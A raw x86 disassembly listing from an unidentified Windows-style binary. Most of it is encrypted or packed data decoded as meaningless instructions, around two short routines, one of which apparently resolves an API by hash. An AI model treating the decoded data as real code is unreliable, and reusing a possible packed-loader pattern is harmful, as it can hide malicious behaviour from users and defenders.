  422bc4:	sbb    ecx,ebp
  422bc6:	daa    
  422bc7:	sbb    DWORD PTR [ecx+0x78],esp
  422bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bcb:	fwait
  422bcc:	add    al,0x99
  422bce:	out    0x77,eax
  422bd0:	test   DWORD PTR [edi+eax*8-0x28],esp
  422bd4:	adc    DWORD PTR [ebx-0x17d20ce4],ebp
  422bda:	sub    ebp,esp
  422bdc:	out    dx,al
  422bdd:	call   0x32b6:0x93d79b8
  422be4:	(bad)  
  422be5:	rcl    ecx,cl
  422be7:	pop    edx
  422be8:	call   0xf270:0xc7589f41
  422bef:	rol    DWORD PTR [edx+0x5c],0xd9
  422bf3:	ins    BYTE PTR es:[edi],dx
  422bf4:	cmc    
  422bf5:	popa   
  422bf6:	out    dx,al
  422bf7:	inc    esi
  422bf8:	or     DWORD PTR [ebx+0x76],0xfe142acd
  422bff:	or     al,0x1f
  422c01:	lods   eax,DWORD PTR ds:[esi]
  422c02:	fwait
  422c03:	add    esp,DWORD PTR [eax-0x72]
  422c06:	inc    esi
  422c07:	scas   eax,DWORD PTR es:[edi]
  422c08:	dec    eax
  422c09:	add    dl,ch
  422c0b:	imul   ecx,DWORD PTR [esi+0x579d7796],0xbceb833d
  422c15:	add    al,0x5f
  422c17:	jl     0x422c85
  422c19:	ja     0x422c3d
  422c1b:	stc    
  422c1c:	push   edx
  422c1d:	loopne 0x422bff
  422c1f:	aad    0x5d
  422c21:	sbb    al,0x91
  422c23:	push   ss
  422c24:	dec    ecx
  422c25:	test   al,0x4d
  422c27:	xchg   ebp,eax
  422c28:	ja     0x422c63
  422c2a:	shl    DWORD PTR [esi],0xaa
  422c2d:	ret    
  422c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c2f:	push   ds
  422c30:	dec    ebp
  422c31:	mov    dh,0xce
  422c33:	mov    ebx,0xb47dd3e6
  422c38:	idiv   DWORD PTR [esi-0x29]
  422c3b:	ret    
  422c3c:	cmp    al,0xdd
  422c3e:	js     0x422bef
  422c40:	inc    DWORD PTR [esi+0x6f]
  422c43:	xchg   esi,esi
  422c45:	das    
  422c46:	ret    0x1781
  422c49:	mov    al,ds:0xaa1323c9
  422c4e:	inc    esp
  422c4f:	push   eax
  422c50:	repz inc ebx
  422c52:	aaa    
  422c53:	cmc    
  422c54:	cmc    
  422c55:	sbb    BYTE PTR [esi+0x1c2cdb59],ah
  422c5b:	cmp    al,0x7b
  422c5d:	out    0xcd,eax
  422c5f:	jbe    0x422c4d
  422c61:	mov    ebp,0x76e545ab
  422c66:	aas    
  422c67:	cmc    
  422c68:	adc    BYTE PTR [ebp+0x10c01b8d],dh
  422c6e:	popf   
  422c6f:	push   esp
  422c70:	inc    edi
  422c71:	jge    0x422c43
  422c73:	push   0xffffffba
  422c75:	xchg   edx,eax
  422c76:	scas   al,BYTE PTR es:[edi]
  422c77:	stos   BYTE PTR es:[edi],al
  422c78:	jae    0x422c2e
  422c7a:	mov    esp,0x736c65bc
  422c7f:	cmp    ch,BYTE PTR [edi]
  422c81:	in     al,0x24
  422c83:	or     eax,0xd4c24fe2
  422c88:	scas   al,BYTE PTR es:[edi]
  422c89:	cmovns ebp,DWORD PTR [ecx]
  422c8c:	rcr    DWORD PTR [ebx+0x28],0xca
  422c90:	jmp    0x83186b96
  422c95:	aam    0x6e
  422c97:	inc    esi
  422c98:	pop    eax
  422c99:	ins    DWORD PTR es:[edi],dx
  422c9a:	outs   dx,DWORD PTR ds:[esi]
  422c9b:	push   ecx
  422c9c:	sub    al,0x83
  422c9e:	or     al,0x56
  422ca0:	enter  0xcb0c,0xd5
  422ca4:	outs   dx,BYTE PTR ds:[esi]
  422ca5:	sar    BYTE PTR [edx-0x7f158e62],1
  422cab:	mov    esi,0x3836d535
  422cb0:	xchg   edx,eax
  422cb1:	mov    esp,0xea399a46
  422cb6:	dec    ecx
  422cb7:	inc    esp
  422cb8:	dec    ecx
  422cb9:	out    0x23,eax
  422cbb:	ror    esp,1
  422cbd:	xchg   ebx,eax
  422cbe:	daa    
  422cbf:	push   ss
  422cc0:	sar    BYTE PTR [edx-0x43],0x1
  422cc4:	cmp    al,0xe1
  422cc6:	or     al,0x49
  422cc8:	lock cmp dh,dl
  422ccb:	and    DWORD PTR [ebx-0x40c284f7],edx
  422cd1:	out    0xe8,eax
  422cd3:	adc    WORD PTR es:[eax+0x17],0x8879
  422cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cdb:	push   eax
  422cdc:	cmp    eax,DWORD PTR [esi+esi*2+0x1e]
  422ce0:	test   BYTE PTR [ecx+0x41],al
  422ce3:	in     eax,0xec
  422ce5:	mov    edx,0x614f9a6a
  422cea:	inc    edi
  422ceb:	dec    ebx
  422cec:	mov    ebp,0xd525db46
  422cf1:	sub    al,BYTE PTR [esi+ebx*8]
  422cf4:	jmp    0x422c8c
  422cf6:	pop    edi
  422cf7:	lods   al,BYTE PTR ds:[esi]
  422cf8:	pop    esp
  422cf9:	inc    eax
  422cfa:	push   edi
  422cfb:	cdq    
  422cfc:	mov    ebx,ebx
  422cfe:	adc    eax,0xa1bb56b
  422d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d04:	pop    ss
  422d05:	sbb    al,0x43
  422d07:	or     eax,0xae0c63ef
  422d0c:	imul   ebp,DWORD PTR [ebx+0x4fcd97ef],0x6a80e804
  422d16:	pop    ds
  422d17:	mov    ebp,0x3349aa0f
  422d1c:	sub    al,0x12
  422d1e:	jns    0x422cb8
  422d20:	mov    ebx,0xce432c9a
  422d25:	xchg   esp,eax
  422d26:	clc    
  422d27:	adc    BYTE PTR [ebp+esi*1-0x465d61b0],bl
  422d2e:	hlt    
  422d2f:	iret   
  422d30:	mov    cl,BYTE PTR [edx-0x55]
  422d33:	adc    BYTE PTR [edx+ebx*8],dl
  422d36:	cmp    dh,BYTE PTR [esi-0x29]
  422d39:	jp     0x422da0
  422d3b:	aaa    
  422d3c:	xor    al,0xa4
  422d3e:	sub    DWORD PTR [ecx+0x562254cd],0xffffffd0
  422d45:	das    
  422d46:	push   ebx
  422d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d48:	les    edx,FWORD PTR [ecx]
  422d4a:	inc    esi
  422d4b:	ja     0x422cf3
  422d4d:	cli    
  422d4e:	mov    ebx,0x550dcd00
  422d53:	sbb    ecx,ecx
  422d55:	push   es
  422d56:	jnp    0x422d48
  422d58:	mov    al,0x20
  422d5a:	xor    DWORD PTR [ebx-0x6472579e],edi
  422d60:	dec    esi
  422d61:	outs   dx,BYTE PTR ds:[esi]
  422d62:	outs   dx,BYTE PTR ds:[esi]
  422d63:	lds    edx,FWORD PTR [eax+edi*2+0x2b8ce9b5]
  422d6a:	sub    DWORD PTR [eax+ebp*8+0x4c],ecx
  422d6e:	push   edi
  422d6f:	add    bl,BYTE PTR [esi+ebx*1]
  422d72:	push   0xffffffb1
  422d74:	cmp    ah,BYTE PTR [eax+edx*2-0x4a8fa684]
  422d7b:	sbb    al,0x4e
  422d7d:	and    ebx,DWORD PTR [edx-0x547911e6]
  422d83:	push   cs
  422d84:	and    esi,DWORD PTR [edi]
  422d86:	call   0x8d2c:0xd42730d4
  422d8d:	push   eax
  422d8e:	mov    eax,0x3c43aaed
  422d93:	sub    eax,0x834eb7b8
  422d98:	out    0x7d,eax
  422d9a:	fisub  DWORD PTR ds:0x71eb43e1
  422da0:	js     0x422d8a
  422da2:	ja     0x422e16
  422da4:	pop    eax
  422da5:	push   esp
  422da6:	popa   
  422da7:	push   edi
  422da9:	fdiv   DWORD PTR [edi+0x8fdcf53]
  422daf:	mov    bl,0x42
  422db1:	inc    edi
  422db2:	fsubr  DWORD PTR ds:0xbb6fc3ba
  422db8:	addr16 jae 0x422d5d
  422dbb:	sbb    DWORD PTR [ecx-0x5a],ebx
  422dbe:	mov    ch,0x6
  422dc0:	sahf   
  422dc1:	fmul   DWORD PTR [eax+eax*2+0x7d]
  422dc5:	aas    
  422dc6:	pop    ebx
  422dc7:	sub    ebx,0xeede7861
  422dcd:	and    ebx,esi
  422dcf:	push   cs
  422dd0:	push   ecx
  422dd1:	sbb    BYTE PTR [edx+0x70],bh
  422dd4:	rol    esp,1
  422dd6:	adc    eax,0x541c97cc
  422ddb:	jbe    0x6b185f33
  422de1:	retf   
  422de2:	xchg   BYTE PTR [edx-0x3e01a89d],dl
  422de8:	push   0xf
  422dea:	stos   DWORD PTR es:[edi],eax
  422deb:	xor    ah,BYTE PTR [esi+0x62d0cb18]
  422df1:	adc    ebp,DWORD PTR [edi-0x45]
  422df4:	lea    ebp,[ecx]
  422df6:	popa   
  422df7:	(bad)  
  422df8:	bound  eax,QWORD PTR [edx+0x3bdf585f]
  422dfe:	leave  
  422dff:	aad    0x40
  422e01:	test   al,0x91
  422e03:	enter  0xe051,0x7e
  422e07:	pop    ss
  422e08:	jno    0x422dcd
  422e0a:	mov    ebx,0xa2b097af
  422e0f:	and    DWORD PTR [eax-0x20997526],edi
  422e15:	loopne 0x422e12
  422e17:	dec    esp
  422e18:	pop    edx
  422e19:	push   eax
  422e1a:	fdivr  DWORD PTR [esi]
  422e1c:	call   0x67259fb1
  422e21:	shl    esp,0xa6
  422e24:	out    dx,eax
  422e25:	jns    0x422dcf
  422e27:	scas   al,BYTE PTR es:[edi]
  422e28:	jno    0x422e3f
  422e2a:	and    al,0x7b
  422e2c:	xchg   edi,eax
  422e2d:	push   es
  422e2e:	fdivr  QWORD PTR [ebp-0x7bba4805]
  422e34:	shl    esp,0xdf
  422e37:	out    dx,eax
  422e38:	xchg   esi,eax
  422e39:	jb     0x422e11
  422e3b:	add    ah,BYTE PTR [edi-0x507342dd]
  422e41:	in     al,0xe0
  422e43:	mov    esp,0x84ce34d
  422e48:	sbb    al,0x55
  422e4a:	rcr    dl,0x5f
  422e4d:	sbb    dl,BYTE PTR [ebp-0x55a46cad]
  422e53:	or     BYTE PTR [esi+0x3e38baf0],ah
  422e59:	cmp    DWORD PTR [esi+0x46],ebx
  422e5c:	icebp  
  422e5d:	inc    edx
  422e5e:	xlat   BYTE PTR ds:[ebx]
  422e5f:	repnz push ecx
  422e61:	add    al,0x38
  422e63:	pop    es
  422e64:	xor    eax,0x9b6da8a6
  422e69:	xchg   ebp,eax
  422e6a:	push   ebx
  422e6b:	mov    ds:0x36b4df00,al
  422e70:	xchg   edx,eax
  422e71:	xchg   BYTE PTR ds:[esi+0x1f555e04],dh
  422e78:	cld    
  422e79:	inc    ebp
  422e7a:	out    dx,eax
  422e7b:	lock mov ebx,0xcea39e57
  422e81:	cmc    
  422e82:	in     al,dx
  422e83:	push   0xffffffab
  422e85:	cmp    BYTE PTR [ebx-0x1b3d012a],dl
  422e8b:	and    ah,dl
  422e8d:	(bad)  
  422e8f:	sti    
  422e90:	imul   edx,DWORD PTR [ebx+0x17751cf3],0xffffffd0
  422e97:	or     ecx,DWORD PTR ds:0x58d5094b
  422e9d:	or     eax,0xe69b2370
  422ea2:	xchg   ecx,eax
  422ea3:	xchg   BYTE PTR [ebx-0x3c5205ff],cl
  422ea9:	iret   
  422eaa:	mov    al,0x40
  422eac:	div    BYTE PTR [ecx]
  422eae:	sbb    esi,ebx
  422eb0:	inc    esp
  422eb1:	mov    cl,BYTE PTR ds:[esi]
  422eb4:	stos   DWORD PTR es:[edi],eax
  422eb5:	aas    
  422eb6:	int3   
  422eb7:	enter  0xa6b4,0xc8
  422ebb:	fstp   TBYTE PTR [edi+0x1fb0c224]
  422ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ec2:	jle    0x422e9f
  422ec4:	or     eax,0xf7e2d861
  422ec9:	jp     0x422f0a
  422ecb:	nop
  422ecc:	std    
  422ecd:	sub    eax,0x77d76184
  422ed2:	add    BYTE PTR [eax],bl
  422ed4:	xchg   esp,eax
  422ed5:	pop    ss
  422ed6:	push   ss
  422ed7:	and    DWORD PTR [ebx-0x3c4e3da4],ebp
  422edd:	pop    edx
  422ede:	clc    
  422edf:	ret    
  422ee0:	mov    ds:0xb21965ef,eax
  422ee5:	pop    ecx
  422ee6:	loop   0x422f5c
  422ee8:	dec    esi
  422ee9:	ins    DWORD PTR es:[edi],dx
  422eea:	xor    eax,0x1bf6b039
  422eef:	sub    eax,0xf5ea0941
  422ef4:	mov    ebp,0x83f221cd
  422ef9:	xlat   BYTE PTR ds:[ebx]
  422efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422efb:	ja     0x422ed8
  422efd:	out    dx,eax
  422efe:	dec    edi
  422eff:	jmp    0x779a:0xd300bc41
  422f06:	(bad)  
  422f08:	repnz es cmp bl,bh
  422f0c:	arpl   WORD PTR [esi],di
  422f0e:	mov    dh,0x40
  422f10:	adc    DWORD PTR [esi],ebx
  422f12:	jne    0x422f8e
  422f14:	outs   dx,DWORD PTR ds:[esi]
  422f15:	out    0x4,al
  422f17:	mov    eax,0x1f3077a2
  422f1c:	js     0x422f20
  422f1e:	mov    bh,0x46
  422f21:	or     esi,DWORD PTR [ebx]
  422f23:	sar    BYTE PTR ds:0x18726c28,cl
  422f29:	mov    eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0x22b495f5
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	jmp    DWORD PTR [ebx-0x54a62baf]
  422fd8:	inc    ebp
  422fd9:	fmul   st,st(7)
  422fdb:	mov    al,BYTE PTR [ebp+0x11c6b5be]
  422fe1:	or     eax,DWORD PTR [ecx+eiz*8-0x58]
  422fe5:	inc    ebp
  422fe6:	fmul   st,st(7)
  422fe8:	mov    es,WORD PTR [ebp-0x11c60a42]
  422fee:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  422ff2:	inc    ebp
  422ff3:	fmul   st,st(7)
  422ff5:	mov    es,WORD PTR [ebp-0x11c64a42]
  422ffb:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  422fff:	inc    ebp
  423000:	fmul   st,st(7)
  423002:	mov    es,WORD PTR [ebp-0x11c64a42]
  423008:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42300c:	inc    ebp
  42300d:	fmul   st,st(7)
  42300f:	jbe    0x422f96
  423011:	mov    esi,0xb1f137b5
  423016:	dec    edx
  423017:	pop    ecx
  423018:	sbb    al,0x4c
  42301a:	adc    eax,0xf28436ee
  42301f:	js     0x423039
  423021:	mov    edx,0x882a2d63
  423026:	xor    eax,0xf7e9a0aa
  42302b:	(bad)  
  42302d:	sbb    DWORD PTR [ebp-0x38c8d596],ecx
  423033:	xor    eax,edi
  423035:	lods   eax,DWORD PTR ds:[esi]
  423036:	jmp    0x422fdd
  423038:	int3   
  423039:	rcl    BYTE PTR [edi-0x32],0x62
  42303d:	sub    bh,BYTE PTR [ecx-0x14]
  423040:	or     cl,BYTE PTR [ebx-0x25151c11]
  423046:	rcl    BYTE PTR [edi],1
  423048:	jecxz  0x423050
  42304a:	dec    esi
  42304b:	jge    0x422ff5
  42304d:	inc    ebp
  42304e:	fmul   st,st(7)
  423050:	mov    es,WORD PTR [ebp+0x12a0b2be]
  423056:	push   edx
  423057:	pop    es
  423058:	mov    eax,ds:0x379b4f3a
  42305d:	sbb    al,0x8f
  42305f:	std    
  423060:	dec    ebp
  423061:	stos   DWORD PTR es:[edi],eax
  423062:	in     al,0x53
  423064:	and    DWORD PTR [ebp-0x5e],edx
  423067:	sbb    ah,BYTE PTR [eax]
  423069:	pop    ebp
  42306a:	test   ch,bl
  42306c:	fisttp DWORD PTR [ebp-0x290cd3cd]
  423072:	push   ebx
  423073:	lock and cl,ah
  423076:	(bad)
  423079:	sub    al,0xbf
  42307b:	adc    eax,0x1f4e3260
  423080:	push   eax
  423081:	xlat   BYTE PTR ds:[ebx]
  423082:	rol    BYTE PTR [ebp-0x4b6bf2],cl
  423088:	sar    DWORD PTR [ecx+eax*1+0xe],0xd9
  42308d:	test   eax,0x1c37804f
  423092:	(bad)  
  423093:	std    
  423094:	dec    ebp
  423095:	stos   BYTE PTR es:[edi],al
  423096:	in     al,0x23
  423098:	mov    ebp,0xfaa2cb
  42309d:	dec    edi
  42309e:	test   al,cl
  4230a0:	inc    esi
  4230a1:	daa    
  4230a2:	xor    esi,DWORD PTR [esi-0x5fac8692]
  4230a8:	mov    ebp,0xe0d6c54a
  4230ad:	mov    dh,0xbf
  4230af:	jnp    0x4230c7
  4230b1:	cdq    
  4230b2:	dec    esi
  4230b3:	add    ebp,ecx
  4230b5:	dec    edx
  4230b6:	ror    BYTE PTR [ebp-0x184be88a],cl
  4230bc:	push   eax
  4230bd:	lea    esp,[ebx+0x7]
  4230c0:	mov    eax,ds:0xcfd84f3a
  4230c5:	mov    es,WORD PTR [ebp-0x11c64a42]
  4230cb:	pop    ebx
  4230cc:	add    DWORD PTR [ecx-0x58],ebx
  4230cf:	or     ecx,ebx
  4230d1:	int    0x8e
  4230d3:	imul   ebx,DWORD PTR [ebp-0x16],0x440bee76
  4230da:	pop    ecx
  4230db:	test   al,0x45
  4230dd:	fmul   st,st(7)
  4230df:	outs   dx,BYTE PTR ds:[esi]
  4230e0:	test   DWORD PTR [ebp+0x1ef32b4],edi
  4230e6:	inc    esp
  4230e7:	pop    ecx
  4230e8:	inc    esp
  4230e9:	inc    ecx
  4230ea:	fmul   st,st(7)
  4230ec:	mov    al,BYTE PTR [ebx-0x11c64a42]
  4230f2:	or     eax,DWORD PTR [ebp-0x1c]
  4230f5:	test   al,0x45
  4230f7:	fcomp  st(7)
  4230f9:	mov    es,WORD PTR [ebp-0x11c34a42]
  4230ff:	or     eax,DWORD PTR [eax+ebx*1-0x58]
  423103:	inc    ebp
  423104:	enter  0x8ecf,0x85
  423108:	mov    esp,0xbeb39b5
  42310d:	inc    ebp
  42310e:	pop    ecx
  42310f:	test   al,0x45
  423111:	fmul   st,st(7)
  423113:	mov    eax,DWORD PTR [ebp-0x11c64a41]
  423119:	or     eax,DWORD PTR [ecx+ebx*2+0x28]
  42311d:	dec    esi
  42311e:	fmul   st,st(7)
  423120:	mov    al,BYTE PTR [ebp-0x14f7f742]
  423126:	or     eax,DWORD PTR [esi+0x59]
  423129:	test   al,0xc5
  42312b:	fmul   st,st(7)
  42312d:	sahf   
  42312e:	test   DWORD PTR [esi+0xbee39a5],edi
  423134:	inc    esp
  423135:	dec    ecx
  423136:	test   al,0x45
  423138:	enter  0x8ecf,0x85
  42313c:	mov    esi,0xbfe39b5
  423141:	inc    esp
  423142:	pop    ecx
  423143:	test   al,0x45
  423145:	fmul   st,st(7)
  423147:	mov    es,WORD PTR [ebp-0x7f424a42]
  42314d:	add    BYTE PTR [eax+esi*1-0x55],al
  423151:	inc    ebp
  423152:	fmul   st,st(7)
  423154:	mov    esi,0x47abe8e
  423159:	out    dx,al
  42315a:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42315e:	inc    ebp
  42315f:	fmul   st,st(7)
  423161:	mov    es,WORD PTR [ebp-0x11c64a42]
  423167:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42316b:	inc    ebp
  42316c:	fmul   st,st(7)
  42316e:	mov    es,WORD PTR [ebp-0x11c64a42]
  423174:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423178:	inc    ebp
  423179:	fmul   st,st(7)
  42317b:	mov    es,WORD PTR [ebp-0x11c64a42]
  423181:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423185:	inc    ebp
  423186:	fmul   st,st(7)
  423188:	mov    es,WORD PTR [ebp-0x11c64a42]
  42318e:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423192:	inc    ebp
  423193:	fmul   st,st(7)
  423195:	mov    es,WORD PTR [ebp-0x11c64a42]
  42319b:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42319f:	inc    ebp
  4231a0:	fmul   st,st(7)
  4231a2:	mov    es,WORD PTR [ebp-0x11c64a42]
  4231a8:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4231ac:	inc    ebp
  4231ad:	fmul   st,st(7)
  4231af:	mov    es,WORD PTR [ebp-0x11c64a42]
  4231b5:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4231b9:	inc    ebp
  4231ba:	fmul   st,st(7)
  4231bc:	mov    es,WORD PTR [ebp-0x11c64a42]
  4231c2:	or     ebp,DWORD PTR [edx+0x2d]
  4231c5:	int    0x3d
  4231c7:	lods   al,BYTE PTR ds:[esi]
  4231c8:	iret   
  4231c9:	mov    es,WORD PTR [ebp-0x11cd6a42]
  4231cf:	or     edx,DWORD PTR [ecx+ebx*2-0x58]
  4231d3:	inc    ebp
  4231d4:	loop   0x4231a1
  4231d6:	mov    es,WORD PTR [ebp-0x41c64a46]
  4231dc:	dec    esi
  4231dd:	pop    es
  4231de:	imul   edi,esp,0xa
  4231e1:	fmul   st,st(7)
  4231e3:	mov    es,WORD PTR [ebp-0x11e64a42]
  4231e9:	or     esp,DWORD PTR [edi+esi*2-0x5355c926]
  4231f0:	mov    es,WORD PTR [ebp-0x11964a42]
  4231f6:	or     eax,DWORD PTR [ecx+ebp*2-0x5d]
  4231fa:	inc    ebp
  4231fb:	fcomp  DWORD PTR [edi-0x74417a72]
  423201:	cmp    eax,0x59440bee
  423206:	test   al,0x45
  423208:	fmul   st,st(7)
  42320a:	mov    es,WORD PTR [ebp-0x31c64a42]
  423210:	or     eax,DWORD PTR [ecx+edi*4-0x58]
  423214:	inc    ebp
  423215:	fmul   st,st(7)
  423217:	mov    es,WORD PTR [ebp-0x11c64a42]
  42321d:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423221:	inc    ebp
  423222:	fmul   st,st(7)
  423224:	mov    es,WORD PTR [ebp-0x11c64a42]
  42322a:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42322e:	inc    ebp
  42322f:	fmul   st,st(7)
  423231:	mov    es,WORD PTR [ebp-0x11c64a42]
  423237:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42323b:	inc    ebp
  42323c:	fmul   st,st(7)
  42323e:	mov    es,WORD PTR [ebp-0x11c64a42]
  423244:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423248:	inc    ebp
  423249:	fmul   st,st(7)
  42324b:	mov    es,WORD PTR [ebp-0x11c64a42]
  423251:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423255:	inc    ebp
  423256:	fmul   st,st(7)
  423258:	mov    es,WORD PTR [ebp-0x11c64a42]
  42325e:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423262:	inc    ebp
  423263:	fmul   st,st(7)
  423265:	mov    es,WORD PTR [ebp-0x11c64a42]
  42326b:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42326f:	inc    ebp
  423270:	fmul   st,st(7)
  423272:	mov    es,WORD PTR [ebp-0x11c64a42]
  423278:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42327c:	inc    ebp
  42327d:	fmul   st,st(7)
  42327f:	mov    es,WORD PTR [ebp-0x11c64a42]
  423285:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423289:	inc    ebp
  42328a:	fmul   st,st(7)
  42328c:	mov    es,WORD PTR [ebp-0x11c64a42]
  423292:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423296:	inc    ebp
  423297:	fmul   st,st(7)
  423299:	mov    es,WORD PTR [ebp-0x11c64a42]
  42329f:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4232a3:	inc    ebp
  4232a4:	fmul   st,st(7)
  4232a6:	mov    es,WORD PTR [ebp-0x11c64a42]
  4232ac:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4232b0:	inc    ebp
  4232b1:	fmul   st,st(7)
  4232b3:	mov    es,WORD PTR [ebp-0x11c64a42]
  4232b9:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4232bd:	inc    ebp
  4232be:	fmul   st,st(7)
  4232c0:	mov    es,WORD PTR [ebp-0x11c64a42]
  4232c6:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4232ca:	inc    ebp
  4232cb:	fmul   st,st(7)
  4232cd:	mov    es,WORD PTR [ebp-0x11c64a42]
  4232d3:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4232d7:	inc    ebp
  4232d8:	fmul   st,st(7)
  4232da:	mov    es,WORD PTR [ebp-0x11c64a42]
  4232e0:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4232e4:	inc    ebp
  4232e5:	fmul   st,st(7)
  4232e7:	mov    es,WORD PTR [ebp-0x11c64a42]
  4232ed:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4232f1:	inc    ebp
  4232f2:	fmul   st,st(7)
  4232f4:	mov    es,WORD PTR [ebp-0x11c64a42]
  4232fa:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4232fe:	inc    ebp
  4232ff:	fmul   st,st(7)
  423301:	mov    es,WORD PTR [ebp-0x11c64a42]
  423307:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42330b:	inc    ebp
  42330c:	fmul   st,st(7)
  42330e:	mov    es,WORD PTR [ebp-0x11c64a42]
  423314:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423318:	inc    ebp
  423319:	fmul   st,st(7)
  42331b:	mov    es,WORD PTR [ebp-0x11c64a42]
  423321:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423325:	inc    ebp
  423326:	fmul   st,st(7)
  423328:	mov    es,WORD PTR [ebp-0x11c64a42]
  42332e:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423332:	inc    ebp
  423333:	fmul   st,st(7)
  423335:	mov    es,WORD PTR [ebp-0x11c64a42]
  42333b:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42333f:	inc    ebp
  423340:	fmul   st,st(7)
  423342:	mov    es,WORD PTR [ebp-0x11c64a42]
  423348:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42334c:	inc    ebp
  42334d:	fmul   st,st(7)
  42334f:	mov    es,WORD PTR [ebp-0x11c64a42]
  423355:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423359:	inc    ebp
  42335a:	fmul   st,st(7)
  42335c:	mov    es,WORD PTR [ebp-0x11c64a42]
  423362:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423366:	inc    ebp
  423367:	fmul   st,st(7)
  423369:	mov    es,WORD PTR [ebp-0x11c64a42]
  42336f:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423373:	inc    ebp
  423374:	fmul   st,st(7)
  423376:	mov    es,WORD PTR [ebp-0x11c64a42]
  42337c:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  423380:	inc    ebp
  423381:	fmul   st,st(7)
  423383:	mov    es,WORD PTR [ebp-0x11c64a42]
  423389:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42338d:	inc    ebp
  42338e:	fmul   st,st(7)
  423390:	mov    es,WORD PTR [ebp-0x11c64a42]
  423396:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  42339a:	inc    ebp
  42339b:	fmul   st,st(7)
  42339d:	mov    es,WORD PTR [ebp-0x11c64a42]
  4233a3:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4233a7:	inc    ebp
  4233a8:	fmul   st,st(7)
  4233aa:	mov    es,WORD PTR [ebp-0x11c64a42]
  4233b0:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4233b4:	inc    ebp
  4233b5:	fmul   st,st(7)
  4233b7:	mov    es,WORD PTR [ebp-0x11c64a42]
  4233bd:	or     eax,DWORD PTR [ecx+ebx*2-0x58]
  4233c1:	inc    ebp
  4233c2:	fmul   st,st(7)
  4233c4:	mov    es,WORD PTR [ebp-0x11c64a42]
